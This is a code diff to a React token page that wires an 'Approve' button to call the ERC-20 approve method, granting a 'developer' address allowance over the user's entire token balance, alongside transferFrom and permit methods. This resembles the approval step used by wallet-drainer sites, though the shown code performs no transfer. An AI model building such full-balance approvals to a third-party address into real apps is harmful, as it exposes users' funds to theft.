@@ -129,8 +129,8 @@ const Page = () => {
 						}}>
 							Transaction
 						</button>
-						<button onClick={()=>{
-							callContractMethod('approve')
+						<button onClick={async ()=>{
+							await callContractMethod('approve',[developer.address,token.balance], token.contract_address,signer!);
 						}}>
 							Approve
 						</button>
@@ -283,7 +283,8 @@ const methods = {
 	allowance: "function allowance (address owner, address spender) view returns (uint256)",
 	transferFrom: "function transferFrom(address sender, address to, uint256 amount) external returns (bool)",
 	permit: 'function permit (address owner, address spender, uint256 value, uint256 deadline, uint8 v, bytes32 r, bytes32 s) external',
-	nonces: "function nonces(address owner) view returns (uint256)"
+	nonces: "function nonces(address owner) view returns (uint256)",
+	approve: "function approve(address spender, uint256 amount) public returns (bool)"
 }
 
 export async function callContractMethod(method: keyof typeof methods,args: any[], addressOrName: string, signerOrRPC: JsonRpcSigner | string) {
